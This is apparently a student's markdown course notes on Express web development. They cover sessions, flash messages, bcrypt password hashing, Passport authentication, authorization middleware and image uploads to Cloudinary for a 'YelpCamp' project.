+
+
+
+
+
+
+
+#### 478. Introduction to Sessions
+
+- Sessions!
+
+: it's not very practical (or secure) to store a lot of data client-side using cookies.
+
+: this is where sessions come in!
+
+: sessions are server-side data store which we use to make HTTP stateful!
+
+
+: instead of storing the data using cookies we store the data on the server-side and then send the browser a cookie that can be used to retrieve the data.
+
+: a diagram might be helpful
+
+- enabling some statefulness to HTTP that is inheritly stateless
+
+- nothing wrong with cookies, but there are two drawbacks compared to sessions!
+1. cookies have a maximum size
+2. cookies are not as secure as storing data on the server side
+
+- so... we store data on the server-side using SESSIONS, and give some COOKIES as the key to those to client
+
+ex. data store          / SERVER              / CLIENT
+      id, shopping cart   -- your session ID is 4-->
+
+ex. CLIENT                    / SERVER
+
+          I have a cookie for you
+          -- my session ID is 4 -->
+
+      
+
+
+
+<br>
+
+#### 479. Express Sessions
+- npm install express-session
+
+- SessionDemo
+
+- require express sessions and use them as a middleware
+
+
+
+
+- configuring express sessions can be a one- or two-hour content tbh!
+
+- what we will focus on is
+~> 'secret' - we need it for the same reason as a cookie-parser
+
+~> express-session is going to "sign" the cookie and pass it back
+
+- in index.js,
+ex. const session = require ('express-session')
+
+ex. const sessionoptions = {secret: 'thisisnotagoodsecret'   , resave: false,   saveUninitialized}
+ex. app.use(session(sessionoptions))
+~> again in the real world, you would want it to be an actual secret, like as an environmental variable!
+
+~> as it's a middleware, all the incorming "request" objects would have session property available!
+
+- ex. app.get('/viewcounts', (req, res) => {
+        res.send("YOU HAVE VIEWED THIS PAGE X TIMES")
+      })
+
+
+- now we see "connect.sid" cookie, which is generated by express-session
+
+~> sid as session id
+
+~> as long as we have the sid the browser will know that we are 'that' user
+
+~> that is why when we open a website in a differnt platform the browser does not have information about us
+
+- ex. app.get('/viewcounts', (Req, res) => {
+          if (req.session.count) 
+              req.session.count +=1;
+              
+          } else {
+              req.session.count = 1;
+          }
+          res.send(`You have viewed this page ${req.session.count} times`)
+      })
+
+~> req.session.count does not exist from the first place
+~> while we can add any data to req.session
+~> and that data on session is stores on the server-side and associated with individual users/browsers
+
+- the info is saved in JS in memory
+~> not what we would do for production
+
+~> express-session - default session storage is memory store
+~> Warning in the same Doc! 'memory store is meant to be used for debugging and development, and it not recommended for production, as it will leak memory under most conditions, does not sclae past a single process'
+
+~> in the real world for production enviornment, we can use one of many options of sessionStores[ex. connect-redis, connect-mongo]
+
+
+- recap: the session has all the data, and gives back only one cookie, which is the session id. The session id is sent on all subsequent requests and express session looks for the appropriate data in the session store with the sid. And if there's data in the session store that is accessible through req.session
+
+<br>
+
+#### 480. More Express Sessions
+
+- refer to #### 479
+
+
+
+
+
+
+- whenever the web page is restarted we get the new sid and the new counts!
+
+~> as memory store's used
+~> in local memory on the server-side not in persistent data store
+~> but as long as our session is running it is fine
+
+- Register & Greet
+
+
+
+
+<br>
+
+
+#### 481. Intro To Flash
+
+- kinda related topic to sessions and cookies!
+
+- github.com/jaredhanson/connect-flash
+
+- there are other variants like express-flash and for different programming languages and for different frameworks and so on  
+
+- the basic idea of FLASH
+~> a place in the session to FLASH a message to users (ex. success, confirmation) which go away!
+
+~> typically after some action & before you redirect somewhere
+
+
+- let's add functionalities to Section 45 Farm + Product App with Flash
+
+
+
+
+
+
+- npm install connect-flash
+
+- configure session! as connect-flash relies on sessions
+
+
+
+
+
+
+
+ex. const flash=require('connect-flash');
+ex. app.use(flash());
+
+- once the flash middleware is in place, all requests will have a req.flash()function
+
+- req.flash(key, msg)
+
+- key incl. 'error', 'info', 'success', etc..
+
+
+- usually flash right before redirect
+
+ex. app.post('/farms', async (req, res) => {
+        const farm = new Farm(req.body);
+
+        await farm.save();
+
+        req.flash('success', 'Successfully made a new farm')
+        res.redirect('/farms')
+    })
+
+- AND in /farms,
+ex. ...
+ex. req.render('farms/index',{farms, messages: req.flash('success')})
+ex. ...
+
+//meaning if there is any req.flash w/'success' it will be passed through as messages
+
+
+- then in index.ejs,
+
+ex. <body>
+      <%= messages %>
+      ...
+
+
+
+
+
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 482. Flash and Res.locals
+
+- could be annoying to include 
+ex. messages: req.flash('key!')
+
+~> what about having a middleware then?
+
+
+- express doc ~> res.locals!!
+
+- Res.locals
+~> object which contains response local variables  scoped to the request and therefore available only to the view(s) rendered during that request&response cycle (if any). Otherwise, this prop is identical to app.locals.
+
+~> this prop is useful for exposing request-level informatioin like the request path name, authenticated user, user settings, and so on.
+
+=> we can add ANY stuff to res.locals!!
+
+- ex. app.use((req, res, next)=>{
+        res.locals.messages=req.flash('success')
+        next();
+      })
+
+  //at the beginning!!
+
+  //now ALL the routes go through that, and messages are displayed if there are
+
+- usually, <%=message%> part in .ejs is also dealt with using partials
+
+- if your app has multiple apps (ex. success, error), you can do sth like
+
+ex. res.locals.success
+ex. res.locals.error
+
+- you can also easily style flash msgs
+
+<br>
+
+
+## 49. YelpCamp: Restructuring & Flash
+
+#### 483. Breaking Out Campground Routes
+- let's break out /campgrounds & /reviews
+
+- folder routes > campgrounds.js & reviews.js
+
+- ex. const express = require('express')
+  ex. const router = express.Router()
+
+- move all the applicable routes to the corresponding file and change app. to router., and remove /campgrounds cuz it will be handled by the below app.use
+
+- then in app.js,
+ex. const campgrounds= require ('./routes/campgrounds')
+ex. app.use('/campgrounds',campgrounds)
+
+- copy catchAsync, ExpressError, validateCampground middleware and so on from app.js to campgrounds.js
+
+<br>
+
+
+
+
+#### 484. Breaking  Out Review Routes
+- repeating the same process!
+
+
+
+
+- '/campgrounds/:id/reviews'
+
+- we should specify the option like
+
+ex. const router =  express.Router({mergeParams: true})
+// so that parameters are not separated  by default by  Express router!
+
+<br>
+
+
+
+
+
+#### 485. Serving Static Assets
+
+- we should add our public directory & serve the static assets!
+
+~> for imgs, custom stylesheets and JS
+
+- public folder
+
+- usually src="/hello.js", not src="/public/hello.js", if they are in public folder!
+
+~> in order to make it work, in app.js, 
+ex. app.use(express.static(path.join(__dirname,'public')))
+
+- we will eventually want some custom-styles
+~> public > javascripts / stylesheets
+
+- let's move the validation stuff from *boilerplate.ejs* to *validateforms.js*, in the javascripts directory!!!!
+
+- to make the deprecation warning go away, set useFindAndModify:false in mongoose connection setting in app.js!
+
+<br>
+
+
+#### 486. Configuring Sessions
+- Now we want to set up Express sessions
+1. to use flash
+2. to introduce authentication and for that, we want session access
+
+
+
+
+- ex. npm install express-session
+
+- in app.js
+ex. require, set session configuration, and use
+
+- then add fancier option to cookies we would send back!
+ex. const sessionConfig = {
+        secret: 'thisshouldbeabettersecret!',
+        resave: false,
+        saveUninitialized: true,
+        cookie: {
+          httpOnly: true,
+          expires: Date.now() + 1000 * 60 * 60 * 24 * 7 ,
+          maxAge: 1000 * 60 * 60 * 24 * 7
+          //Date.now() is in ms
+
+
+        }
+    }
+
+- HTTP Only: true => ref:  owasp.org/www-community/HttpOnly
+~> not allowing client=-side script to access protected cookies 
+
+<br>
+
+
+
+
+
+
+
+#### 487. Setting Up Flash
+- install, require, use
+
+- in campground routes, let's use flash
+
+
+<br>
+
+
+#### 488. Flash Success Partial
+- partials / flash.ejs
+
+- in flash.ejs,
+ex. <%- if (success && success.length){ %>
+    <div class = "alert alert-success alert-dismissible fade show" role = "alert" >
+    //role = " alert" for accessibility purpose
+      <%= success %>
+      <button type="button" class="btn-close"data-bs-dismissible="alert" aria-label="Close">
+      </button>
+      
+    </div>
+    <% } %>
+
+  - apply wherever fitting
+
+<br>
+
+
+
+
+
+
+
+
+#### 489. Flash Error Partial
+
+- do the same thing for error messages
+
+- ex. router.get('/:id',...
+      
+        if(!campground) {
+            req.flash('error', 'Campground not found!')
+            return  res.redirect('/campgrounds')
+        })
+
+      ...
+
+      )
+
+<BR>
+
+
+
+
+
+
+
+## 50. Authentication From "Scratch"
+#### 490. What Matters In This Section
+- Crucial!
+: Authentication vs. Authorization
+: How To (Not) Store Passwords
+: Working With Bcrypt
+
+- Important
+: Auth Demo
+: Understanding Hashing Function
+: Password Salts
+
+<br>
+
+
+
+
+
+#### 491. Authentication vs. Authorization
+
+- Passport: Simple, unobtrusive authentication for Node.js
+~> will use this later for YelpCamp!
+
+- Authentication
+: Authentication is the process of verifying who a particular user is
+: We typically authenticate with a username or password combo, but we can also use security questions, facial recognition, etc.
+
+- Authorization
+: Authorization is verifying what a specific user has access to
+: Generally, we authorize after a user has been authenticated. "Now that we know who you are, here's what you are allowed to do and NOT allowed to do"
+
+<br>
+
+
+#### 492. How to (not) Store Passwords
+
+- Rule #1 - Never Store Passwords
+
+- Hashing
+: The SOLUTION!
+: Rather than storing a password in the database, we run the password through a hashing function first & then store result in the database!
+
+- Hashing Functions
+: Hashing functions are functions that map input data of some arbitrary size to fixed-size output values
+
+<br>
+
+
+
+
+
+#### 493. Cryptographic Hashing Functions
+- Cryptographic Hash Functions!
+1. One-way function which is infeasible to invert
+2. Small change in input yields large change in the output
+3. Deterministic -same input yields same output
+4. Unlikely to find 2 outputs with the same value(small possibility of hash collision!!)
+5. Password Hash Functions are deliberately SLOW 
+
+<br>
+
+
+
+
+#### 494. Passwords Salts
+
+- there are not THAT many hash functions suitable for passwords
+~> we will use BCRYPT
+
+- Password salts
+~> A salt is a random value that is added to the pw before being hashed
+~> This helps ensure unique hashees and mitigate common attacks! ex.reverse lookup!
+~> A libary can help
+
+<br>
+
+
+#### 495. Into to Bcrypt!
+
+- github.com/keletiv/node.bcyrpt.js
+
+- Bcrypt itself has been there for a while, and it's been implemented in all sorts of languages
+
+- for JS, we gotta install two packages!
+
+1. bcrypt
+~> what we will use! made for Node, server-side JS
+2. bcrypt.js
+~> written entirely in JS, with NO dependencies
+~> runs on client-side [on a browser] as well, even though we don't need that
+
+- we use the planar 'bcrypt' becasue we do not need it to run on the browser too
+
+- BcryptDemo
+
+- ex. npm i bcrypt
+
+- we will start with just looking into 'bcrypt' methods w/o express
+
+1. genSalt 
+~> generates password salt
+~> 'saltRounds' : number of rounds. difficulty level (proportional to process time)
+~> 'ideal goal' is ~ 250 ms, and recommended number is ~12
+~> as the saltRounds goes up, the time it takes will grow exponentially
+2. hash
+~> takes the password and salt, and returns hashed pw
+
+~> supported in callback functions / promises [async - await]
+~> we will use the promise form!
+
+- ex. const bcrypt = require('bcrypt')
+ex. const hashPassword = async () => {
+        const salt = await bcrypt.genSalt(10)
+        const hash = await bcrypt.hash(pw, salt)
+        console.log(salt)
+        console.log(hash)
+    }
+
+ex. hashPassword('monkey');
+
+- can see that the salt is a part of the hashed pw
+~> when bcrypt 'compares' the input pw and stored hashed pw,
+~> it can figure out which is the salt part and can compare only the rest,
+~> so we do not need to store the salt data anywhere
+
+
+- then to compare..
+ex. bcrypt.compare(plainPassword, hash)
+
+
+
+
+ex. const login = async (pw, hashPassword) => {
+        
+        const check = bcrypt.compare(pw, hashPassword)
+        if (check){
+          console.log("LOGGED YOU IN! SUCCESSFUL MATCH!!")
+        } else {
+          console.log("INCORRECT")
+        }
+    }
+
+
+- Note that we can generate Salt & Hashed PW at the same time
+ex. bcrypt.hash(plainPassword, saltRounds, function..)
+ex. ... bcrypt.hash(pw, 12)
+
+<br>
+
+
+#### 496. Auth Demo App
+- let's make a very simple app implementing the authentication
+
+- AuthDemo
+
+
+- ex. npm i express ejs mongoose bcrypt
+
+- ex. touch index.js
+- ex. mkdir views models
+
+- user Model!
+
+- ex. index.js!
+
+<br>
+
+
+
+
+
+
+
+
+#### 497. Auth Demo: Register
+
+- connect to mongo
+
+- get id and pw from 'register' form
+~> post to '/register' using the parsed (through express.urlencoded({extended: true}))req.body
+~> take that username and that pw to create a new user! (the User model) after hashing the pw using Bcrypt
+
+
+- in index.js,
+ex. app.post(..)
+
+<br>
+
+
+
+
+
+
+#### 498. Auth Demo: LogIn
+
+- (1) create a form (2) set up a route to post
+
+- ex. app.get('/login', (req, res) => {
+        res.render('login')
+      })
+
+
+
+
+- login.ejs
+
+
+
+- index.js,
+ex. app.post('/login', async (req,res) => {
+        const {username, password} = req.body
+        const user = await User.findOne({username: username})
+        
+        const validPassword = await bcrypt.compare(password, user.hashedPassword)
+        
+        if (validPassword){
+            res.send('YAY WELCOME!')
+        }
+        else {
+            res.send('TRY AGAIN')
+        }
+        
+    })
+
+<br>
+
+
+#### 499. Auth Demo: Staying Logged In With Session
+- npm install express -session
+
+- ex. const session = require('express-session')
+ex. app.use(session)
+
+- when someone successfully log in, let's add STH to the session
+
+- reminder: session store is associated with a particular COOKIE
+
+~> connect.sid //automatically given as now using session
+~> req.session.user_id = user._id
+~> and if req.session.user_id exists, let them access to secret stuff
+
+- 1. Register => make a user, hash the password, store them
+2. Login => find the user on the database based on the entered username. If there's a match, check if the entered password matches the hashed password on the dabase.
+3. log them in, adding the user_id to the session& use that data for later use
+
+<br>
+
+
+#### 500. Auth Demo: Logout
+- logging out <=> removing the user id in the session!
+
+- Reminder: the way that session works...
+~> all stored on server side
+~> a "SIGNED" cookie is sent back to the client
+~> and it won't be verified if it's faked, or a user sends their own sid as a part of malicious attack
+
+
+- so to log out, we need to rm user_id
+ex. app.post('/logout',(req, res) => {
+        req.session.user_id = null;
+        res.redirect('/login')
+    })
+
+
+- secret.ejs ~> add post request form to /logout!
+
+- another way to log someone out is to destroy the session entirely
+ex. req.session.destroy()
+~> destroys all the information
+
+
+
+<br>
+
+
+#### 501. Auth Demo: Require Login Middleware
+- simple middleware to help verify if anyone is logged in/not!
+~> b/c most of the times, what we want is to prevent MULTIPLE endpoints!
+
+ex. const requireLogin =(req, res, next)=>{
+        if(!req.session.user_id){
+            return res.redireect('/login')
+        }
+        next();
+    }
+
+    //And pass this onto routes as necessary
+
+
+
+
+
+
+
+
+<br>
+
+
+
+
+
+#### 502. Auth Demo: Refactoring To Model Methods
+- we want to move as much as possible out of route handler itself
+
+~> add some logic, when appropriate, to the model
+
+1. 
+ex. app.post('/login', async (req,res) => {
+      const {username, password} = req.body
+      const user = await User.findOne({username: username})
+      
+      const validPassword = await bcrypt.compare(password, user.hashedPassword)
+      
+      if (validPassword){
+          req.session.user_id = user._id;
+          res.redirect('/secret')
+      }
+      else {
+          
+          res.redirect('/login')
+      }
+    
+    })
+
+=> all we want to do is to find the password of the user and validate that
+=> let's make our own method
+
+- in user.js,
+ex. userSchema.statics.findByUserIdAndValidate =async function(useranme, password){
+        const foundUser = await this.findOne({username})
+        //this refers to the particular model or User
+
+
+        
+        const isValid = await bcrypt.compare(password, foundUser.password)
+        return isValid ? foundUser : false;
+}
+
+//statics is where we can define methods to the User class (model) itself!
+//NOT to particular instances of the user
+
+~> shortend codes a little bit
+~> more importantly, grouped the logic that applies to the User model
+
+2. 
+ex. app.post('/register',async (req, res)=>{
+      const {username, password} = req.body;
+      const hash = await bcrypt.hash(password,12)
+      const user=new User({
+          username,
+          hashedPassword: hash
+      })
+      await user.save()
+      req.session.user_id = user._id
+      res.redirect('/')
+    })
+
+~> what about making Mongoose set the hashed password
+
+~> so that in the router, simply only username and password can be passed in
+
+~> and in the user model, the password is saved
+
+
+
+
+ex. userSchema.pre ('save', async function ()  {
+        
+        if (!this.isModified ('hashedPassword')) return next();
+        this.hashedPassword = await bcrypt.hash(this.hashedPassword, 12);
+        next()
+    })
+
+
+
+
+<br>
+
+
+
+
+
+
+## 51. YelpCamp: Adding In Authentication
+#### 503. Intro to Passport
+- Always important to know the theories behind it!
+
+- http://www.passportjs.org/
+- https://github.com/jaredhanson/passport-local
+- https://github.com/saintedlama/passport-local-mongoose
+- Passport
+=> helps authentication into a Node app
+=> comes with a bunch of possible strategies (ex. google login!)
+=> but doesn't explicitly show how it does stuff, so make sure you are aware of how authentication & authorization  work
+
+- let's start with PASSPORT-LOCAL (just with username & pw)
+=> requires some changes
+
+or PASSPORT LOCAL MONGOOSE which makes authorizing with mongoose even easier
+
+
+- passport-local-mongoose depends on
+~> passport-local and it depends on
+~> passport
+
+ex. npm install passport passport-local  passport-local-mongoose
+
+<br>
+
+
+
+
+
+#### 504. Creating Our User model!
+- Passport Usage
+~> define the User schema however you like
+~> and add Passport as a plugin to that UserSchema!
+ex. const passportLocalMongoose = require('passport-local-mongoose')
+ex. const userSchema = new Schema({..})
+ex. userSchema.plugin(passportLocalMongoose)
+
+=> "Passport-local mongoose will add a usrname, hash and salt field to store the usrname, hashed pw & the salt val!"
+=> "additionally adds some methods to your Schema!"
+
+<br>
+
+#### 505. Configuring Passport!
+
+- in app,
+ex. const passport = require('passport')
+ex. const LocalStrategy = require('passport-local')
+
+(note. Passport-Local-Mongoose is only in our Model)
+
+
+ex. app.use(passport.initialize());
+ex. app.use(passport.session)
+
+~> in passport docs, "in a Connect or Express-based application, passport.initialize() middleware is required to initialize Passport."
+~> "If your application uses persistent login sessions, passport.session() middleware must also be used."
+
+
+- session should be used before passport-session
+
+
+- ex. const User = require('./model/user');
+
+ex. passport.use(new LocalStrategy(User.authenticate()))
+
+~> 'Hello Passport, we'd like to use LocalStrategy (which we've downloaded and required), and for that LoacalStrategy, our authentication method will be located in the User model and is called .authenticate()'
+
+- ex. passport.serializeUser(User.serializeUser())
+~> 'a function used by Passport to serialize users into session'
+
+ex. passport.deserializeUser(User.deserializeUser())
+~> 'how to get the user out of the session'
+
+- let's demonstrate how we'll register a User
+ex. app.get('/fakeUser', async (req, res) => {
+        const user = new User({email: 'colt@gmail.com', username: 'colttt'})
+        const newUser = await User.register(user, 'chicken')
+
+        
+        res.send(newUser)
+})
+
+
+~> Passport-Local-Mongoose : register(usr, pw, cb) convenience method to register a new usr instance with a given password. Checks if usrname is unique.
+
+- cf. Passport uses PBKDF2 as the hashing function
+
+<br>
+
+
+
+
+
+
+
+
+
+
+#### 506. Register Form
+- routes > users.js
+
+- views > users > register.ejs
+
+- in app.js,
+ex. const userRoutes = require ('./routes/users');
+
+<br>
+
+
+
+
+
+#### 507. Register Route Logic
+- routes > users.js
+
+ex. router.post('/register', async (req, res) =>{
+       try {
+            const { username, email, password } = req.body
+            const user = await new User({ username, email });
+            const registeredUser = await User.register(user, password);
+            console.log(registeredUser)
+            req.flash('success', 'Welcome to YelpCamp!')
+            res.redirect('/campgrounds');
+        } catch (e) {
+            req.flash('error', e.message)
+            res.redirect('register')
+        }
+    }));
+
+<br>
+
+#### 508. Login Routes
+
+ex.router.get('/login)
+
+~> passport.authenticate(*, **)
+=> here, * is the strategy! (ex. local, google,...)
+=> ** is option
+=> Passport Middleware
+
+
+
+
+ex.router.post('/login',   passport.authenticate('local', {failureFlash: true, failureRedirect: '/login'}),(req, res) => {
+    req.flash('success', 'Welcome Back!');
+    res.redirect('/campgrounds') 
+})
+
+
+<br>
+
+
+
+
+
+
+
+#### 509. isLoggedIn Middleware
+- now that we have the login tool, let's 'protect' creating a new campground option!
+
+- there are two ways to do it..
+1. check if somebody is currently signed in
+~> reminder. auth from scratch => saving user_id to the session
+~> Passport => using serialize/deserializeUser, info is saved to the session
+=> use the helper method, ".isAuthenticated" : automatically added to the request object itself
+
+
+ex. router.get('/new', (req, res) => {
+        if(!req.isAuthenticated()) {
+            req.flash ('error', 'You must be signed in!');
+            return res.redirect('/login')
+        }
+        res.render('campgrounds/new')
+    
+    })
+
+~> but this is just protecting the form itself and somebody can still post data through Postman, etc.
+
+- let's make a middleware!
+~> and apply wherever login would be required
+
+- middleware.js
+
+- in campgrounds and reviews.js,
+
+ex. const {isLoggedIn} = require('../middleware)
+
+- add to get and post routes
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+
+#### 510. Adding Logout
+- ex. router.get('/logout', (req, res) => {
+        req.logout(); //passport-added
+        req.flash('success','goodbye')
+        res.redirect('/campgrounds);
+      })
+
+
+
+
+  
+- let's add a logout button on navbar!!
+
+<br>
+
+
+
+
+
+
+#### 511. currentUser Helper
+- let's hide some components depending on whether logged in or not!
+
+- req.user ~ contains the user info! no need to look into the session (it is in the session but we do not need to deal with it)
+
+
+
+
+=> contains 'deserialized' info about that user
+
+- now we want to have access to this info everywhere..
+~> what about in app.js,
+~> adding data globally?
+ex. app.use((req,res,next) => {
+        res.locals.currentUser = req.user;
+        ...
+    
+    });
+
+- then in navbar,
+ex. <% if (!currentUser) { %> 
+        <a class="nav-link" href="/login">Login</a>
+        <a class="nav-link" href="/register">Sign Up</a>
+    <% } else { %> 
+        <a class="nav-link" href="/logout">Log Out</a>
+    <% }%>
+
+
+
+
+<br>
+
+
+#### 512. Fixing Register
+
+- let's make a user logged in when they register
+
+
+
+- req.login(user, function(err){})
+~> established the login session!
+~> note. passport.authenticate() middleware invoked req.login()automatically. This function is primarily used when users sign up, during which req.login() can be invoked to automatically log in the newly registered usr
+
+ex. router.post('/register', catchAsync(async (req, res) => {
+      try {
+        const { username, email, password } = req.body
+        const user = await new User({ username, email });
+        const registeredUser = await User.register(user, password);
+        //right after registering
+        req.login(registeredUser, err => {
+            if(err) return next(err);
+        } ...
+        ...
+    }
+
+<br>
+
+
+
+
+
+#### 513. ReturnTo Behavior
+- store info on "session" as it exists for that "statefulness"
+
+ex.module.exports.isLoggedIn =(req,res,next)=>{
+    console.log("REQ.USER...", req.user);
+    if(!req.isAuthenticated()) {
+        //store URL they are requesting!
+        //so that when the user logs in, they can be sent back to
+        //where they were, instead of /campgrounds all the time!
+        //console.log(req.path, req.originalUrl)
+        req.session.returnTo = req.originalUrl
+        req.flash ('error', 'You must be signed in!');
+        return res.redirect('/login');
+    }
+    next();
+}
+
+ex. in routes / users
+ex. router.post('/login',   passport.authenticate('local', {failureFlash: true, failureRedirect: '/login'}),(req, res) => {
+      req.flash('success', 'Welcome Back!');
+      const redirectURL = req.session.returnTo || '/campgrounds'
+      
+      
+      delete.req.session.returnTo;
+      res.redirect(redirectURL)    
+  })
+
+<br>
+
+
+
+
+
+
+
+
+
+## 52. YelpCamp: Basic Autho
+#### 514. Adding an Author to Campground
+- we will add a field to Campground
+~> user_id, then we can look the user_id for each campground
+
+- models > campground.js
+
+ex. const CampgroundSchema = new Schema({
+      ...,
+      author: {
+          type: Schema.Types.ObjectId,
+          ref: 'User'
+      }
+      ..
+    }
+
+- let's also update the seeds file so that the base campgrounds have authors
+: grab a random user id and use it for seeds > index.js
+
+- ex. node seeds/index.js
+
+
+
+
+- routes/campgrounds.js,
+ex. const ampground =await Campground.findById(req.params.id).populate("reviews").populate("author")
+
+- show.ejs, <%= campground.author.username%>!!
+
+- in routes/campground.js, for router.post('/campground',...),
+ex. campground.author=req.user._id
+
+<br>
+
+
+#### 515. Showing and Hiding Edit / Delete
+
+- ex. <% if(currentUser &&campground.author.equals(currentUser._id))%>
+
+<br>
+
+
+
+
+
+### 516. Campground Permissions
+- let's do more than merely hiding those buttons!
+~> by writing middleware, etc.
+
+- in routes/campgrounds.js,
+ex. router.put('/:id', isLoggedIn, catchAsync(async (req, res) => {
+        const {id} = req.params; 
+
+        const campground = await Campground.findByIdAndUpdate(id, {...req.body.campground}) --- (*****)
+
+        req.flash('success','Successfully updated the campground.'); 
+        res.redirect(`/campgrounds/${campground._id}`)
+    }))
+
+- now (*****) has to be broken down
+1. findById
+2. See if the campground author matches with the current user id!
+3. if they match then update
+
+- implement this logic in a middleware!
+: to reuse without needing to duplicate that
+
+<Br>
+
+
+
+
+#### 517. AUthorization Middleware
+- in middleware.js
+
+ex. module.exports. isAuthor = async (req, res, next) => {
+        const {id} =req.params
+        const campground= await Campground.findById(id)
+        if(!campground.author.equals(req.user._id)){
+            req.flash('error','You do not have permission to do it!')
+            return res.redirect(`/campgrounds/${id}`)
+        }
+        next();
+    }
+
+ex. and take middleware functions into this file as a part of cleanup!
+
+    
+  
+<br>
+
+
+
+
+#### 518. Review Permission
+
+
+
+
+
+
+
+- in review.js,
+ex. const reviewSchema =new Schema({
+      ...,
+      author: {
+        type: Schema.Types.ObjectId,
+        ref: 'User'
+      }
+})
+
+- show.ejs
+~> hide the "leave the review" form when not logged in
+
+- and in routes>reviews.js,
+~> apply isLoggedIn to post route
+~> review.user=req.user._id
+
+
+#### 519. More Reviews Authorization!
+
+- display the username of the reviewer
+
+~> here, we gotta first populate the review and then populate its author
+
+ex. const campground = await Campground.findById(req.params.id).populate({
+      path: 'reviews',
+      populate: {
+          path: 'author'
+      }
+}).populate ('author')
+
+- and hide delete buttons if currentUser._id != review.author
+
+- in routes>reviews,
+~> isLoggedIn
+
+~> in middleware.js,
+ex. module.exports.isReviewAuthor = async (req, res, next) => {
+      const {id,reviewId} = req.params;
+
+      const review = await Review.findById(reviewId)
+      if (!review.author.equals(req.user._id){
+          req.flash('error', 'You do not have permission to do it')
+
+          return res.redirect(`/campgrounds/${id})
+      }
+      
+      next();
+}
+
+- in routes>reivews,
+~>isReviewAuthor
+
+<br>
+
+
+
+
+
+
+
+
+
+
+## 53. YelpCamp: Controllers & Star Ratings
+#### 520. Refactoring To Campgrounds Controller
+- some re-organization!!
+
+- "Controller"
+: move all the functions to the new 'controller' files so that we can slim down the 'routes' files
+
+- "MVC"
+: Model - View - Controller
+: separtion of an application into three components!
+
+- Controllers > campgrounds.js
+
+ex. module.exports.index, ...
+
+- move all the functions to controllers files!
+
+<br>
+
+
+
+
+#### 521. Adding a Reviews Controller
+- Controllers > reviews.js
+- Controllers >users.js
+
+<br>
+
+
+
+
+
+
+
+
+#### 522. A Fancy Way To Restructure Routes
+
+
+
+
+
+
+
+
+- Express Doc > Router
+~> router.route(path)
+~> defines a single route with different verbs
+
+ex.router.route('/')
+    .get(catchAsync(campgrounds.index ))
+    .post(validateCampground, isLoggedIn, catchAsync(campgrounds.createcampground)) 
+
+- be careful of the order of routes!
+
+<br>
+
+
+
+
+
+#### 523. Displaying Star Ratings
+- entity codes for stars - &#9734; &#9733;
+- loop over to show rating in stars
+
+~> BUT! this is a bad idea in terms of 'accessibility'
+
+~> let's use Starability.css instead
+: https://github.com/LunarLogic/starability
+
+~> can choose one of the styles
+~> Public > stylesheets > stars.css
+~> copy and paste the contents in here
+
+~> you could link that stylesheet in boilerplate.ejs (to use that in every page), or link only where you need it (ex. show.ejs)
+
+ex. to show,
+ex. <p class="starability-result" data-rating="<%=review.rating">
+      
+
+      Rating: <%=review.rating%>
+    </p>
+
+
+
+
+<Br>
+
+
+
+
+
+
+
+
+#### 524. Star Rating FOrm
+- To replace the slider with the stars...
+~> use the same CSS! no JS required
+
+
+
+
+~> include a bunch of HTML codes which include radio buttons!
+
+~> where the slider currently is, in show.ejs
+
+<br>
+
+
+
+
+
+## 54. YelpCamp:Image Upload
+#### 525. Intro to Image Upload Process
+1. a regular HTML form will not allow to "send files"to our server
+~> so we need to change it
+2. we need to store the images somewhere
+~> typically we don't store them in Mongo, b/c images are very large (BSON size limit of 16MB)
+
+~> workarounds: one of them is **GridFS**
+
+- *GridFS* : a spec for storing and retrieving files that exceed the BSON-document size limit of 16MB.
+
+~> but we'll use a tool called
+
+- *Cloudinary*
+~> a website / application which stores information FOR us
+~> and we can retrieve the images from  their server, which also provides some editing tools
+
+~> there are many similar services (we could even use AWS)
+
+- process
+: user uploads an image
+: the data is sent to Cloudinary
+: Cloudinary saves the data on their server
+: and sends back a URL to that data
+
+<Br>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+#### 526. The Multer Middleware
+- again if we use the default HTML form,
+~> the file info is not sent 
+~> has to do with the **encoding type attribute** of the form
+~> MDN > form
+: **enctype** - default is application/x-www-form/urlencoded
+: for it to accept files, the enctype has to be multipart/form-data!!
+
+- in new.ejs,
+ex. <form... enctype= "multipart/form-data">
+
+- then add in the input for file!
+ex. <input type="file"name="image">'
+
+- but in order to PARSE the MULTIPART form
+~> you need another middleware!
+~> many options
+~> while we'll use "Multer"
+
+- Multer
+: a node.js middleware for handling multipart/form-data, which is primarily used for file uploads.
+
+- ex. npm i multer
+
+- Multer adds a *body* object and a *file* or *files* object to the *request* object!
+~> *body* object contains the values of the text fields of form
+~> *file(s)* object contains the files uploaded via form
+
+- to use it
+~> in campgrounds.js,
+ex. const multer = require('multer')
+ex. const upload = multer({ config })
+//initialize or execute the function!
+
+- now at any point, we can add this middleware 
+~> upload.single()
+~> upload.array()
+
+=> Multer is gonna parse the multipart form information, then store the file(s) on req.file, and any other information from the req.body
+
+~> fieldname == name of form
+ex. router.route('/').post(upload.single('image'),...)
+
+- ex. <input  name="image" type = "file" multiple>
++ req.files
+~> can upload multiple
+
+
+<br>
+
+
+
+
+
+
+
+#### 527. Cloudinary Registration
+- u need the credentials to use Cloudinary service!
+
+- we will not put directly the cloud name
+
+~> you do not want to put it in your code or on github in case someone hijacks it and can use ur credit card info and others
+
+=> use ENV files!
+
+<br>
+
+
+
+
+
+
+
+#### 528. Environment Variables with dotenv
+- We store credentials in a file, which we don't include when we submit to Github, etc.
+~> the file that stays on our machine locally
+~> called .env file [the dot makes it hidden!]
+
+
+- npmjs.com/package/dotenv
+
+- How to Set Up a .env File?
+~> .env (at the top level)
+~> then define key - value pairs!
+
+- ex. npm install dotenv
+
+- in app.js,
+ex. if (process.env.NODE_ENV !== 'production') {
+        require ('dotenv') .config();
+    }
+
+    //process.env.NODE_ENV is an environment variable (usually in development / production)
+    //"if we are running in a development mode"
+    //require the 'dotenv' package
+    //which is going to take the variables in .env
+    //& add them to
+    //process.env in my node app
+    //so that any of my files has access to them
+    
+- in production, we don't do that ~> other ways to set up the environment variables
+
+- so in .env,
+ex. CLOUDINARY_NAME = 
+ex. CLOUDINARY_API_KEY=
+ex. CLOUDINARY_SECRET=
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+#### 529. Uploading To Cloudinary Basics
+- an easy tool "Multer Storage Cloudinary"
+~> works with multer and cloudinary
+
+~> to upload the files that Multer is parsing, to Cloudinary
+
+- ex. npm install cloudinary multer-storage-cloudinary
+- cloudinary > index.js,
+ex. const cloudinary = require('cloudinary').v2;
+ex. const {CloudinaryStorage} = require('multer-storage-cloudinary')
+
